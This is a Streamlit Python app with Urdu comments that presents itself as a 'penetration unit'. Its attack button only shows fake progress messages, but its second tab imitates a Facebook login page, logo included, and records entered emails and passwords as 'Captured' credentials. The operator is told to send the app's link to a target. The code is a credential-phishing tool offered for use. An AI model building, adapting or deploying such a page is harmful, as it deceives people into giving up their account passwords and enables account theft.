import streamlit as st
import time

# پیج سیٹنگ
st.set_page_config(page_title="FKG 🫀 SYSTEM", layout="centered")

# ڈارک ہیکر لک کے لیے CSS
st.markdown("""
    <style>
    .stApp { background-color: #000000; }
    .stButton>button { width: 100%; border-radius: 10px; height: 50px; font-weight: bold; }
    .stTextInput>div>div>input { background-color: #1a1a1a; color: #33ff33; border: 1px solid #33ff33; }
    .success-box { padding: 10px; border: 1px solid #33ff33; color: #33ff33; border-radius: 5px; background: #0a290a; }
    </style>
    """, unsafe_allow_html=True)

# سیشن سٹیٹ تاکہ ڈیٹا غائب نہ ہو
if 'attack_ready' not in st.session_state:
    st.session_state.attack_ready = False
if 'creds' not in st.session_state:
    st.session_state.creds = []

# ٹائٹل
st.markdown("<h1 style='text-align: center; color: red;'>FKG 🫀 PENETRATION UNIT</h1>", unsafe_allow_html=True)

# مین کنٹرول پینل
tab1, tab2 = st.tabs(["CONTROL CENTER", "VICTIM VIEW (PREVIEW)"])

with tab1:
    ip = st.text_input("TARGET_IP_ADDR", placeholder="e.g. 192.168.1.1")
    
    if st.button("EXECUTE ATTACK"):
        with st.status("Injecting Payload...", expanded=True) as s:
            time.sleep(1)
            st.write("Bypassing Firewall...")
            time.sleep(1)
            s.update(label="SYSTEM COMPROMISED!", state="complete")
        st.session_state.attack_ready = True

    if st.session_state.attack_ready:
        st.markdown("<div class='success-box'>✔ EXPLOIT SUCCESSFUL</div>", unsafe_allow_html=True)
        st.write("")
        
        # اصلی لنک جو آپ کاپی کر کے کسی کو بھی بھیج سکتے ہیں
        actual_link = "https://fkg-tool-2r9hhebwsdbwdbeyemcxpb.streamlit.app" # اپنی ایپ کی لنک یہاں لکھیں
        st.code(actual_link, language="text")
        st.info("Copy the link above and send it to target.")
        
        st.divider()
        st.subheader("Captured Logs:")
        if st.session_state.creds:
            for c in st.session_state.creds:
                st.error(f"Captured: {c}")
        else:
            st.write("Waiting for victim to login...")

with tab2:
    # یہ وہ حصہ ہے جو دوسرے موبائل پر لنک کھولنے سے نظر آئے گا
    st.image("https://upload.wikimedia.org/wikipedia/commons/6/6c/Facebook_Logo_2023.png", width=60)
    st.subheader("Login to Facebook")
    
    u = st.text_input("Email or Phone", key="fb_u")
    p = st.text_input("Password", type="password", key="fb_p")
    
    if st.button("Log In", type="primary"):
        if u and p:
            st.session_state.creds.append(f"User: {u} | Pass: {p}")
            st.toast("Connecting to server...")
            time.sleep(1)
            st.success("Login successful. Redirecting...")
            time.sleep(1)


